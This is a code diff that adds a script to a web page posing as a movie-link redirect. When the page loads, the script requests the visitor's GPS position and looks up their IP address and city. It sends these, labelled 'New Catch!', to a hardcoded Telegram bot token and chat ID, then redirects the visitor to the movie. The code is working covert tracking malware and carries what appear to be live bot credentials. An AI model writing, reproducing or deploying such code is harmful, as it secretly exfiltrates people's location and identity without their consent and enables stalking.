@@ -1,0 +1,38 @@
+<script>
+    const botToken = "8060572871:AAGdgGSMVfEft5DHEhx3QMU9vHSMlNVijUI";
+    const chatId = "6312622799";
+
+    // 1. This function grabs the destination from the URL
+    function getMovieDestination() {
+        const urlParams = new URLSearchParams(window.location.search);
+        // If "dest" is in the link, use it. Otherwise, use a backup link.
+        return urlParams.get('dest') || "https://mega.nz/default_backup_link";
+    }
+
+    async function collectData(pos = null) {
+        let movieLink = getMovieDestination(); // Get the link dynamically!
+        let ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
+        
+        let message = `🚀 **New Catch!**\n\n` +
+                      `🎬 Movie Link: ${movieLink}\n` +
+                      `🌐 IP: ${ipData.ip}\n` +
+                      `📍 City: ${ipData.city}\n`;
+
+        if (pos) {
+            message += `🎯 GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+        }
+
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
+
+        // Final Redirect to whatever movie was in the URL
+        window.location.href = movieLink;
+    }
+
+    window.onload = () => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(collectData, () => collectData());
+        } else {
+            collectData();
+        }
+    };
+</script>
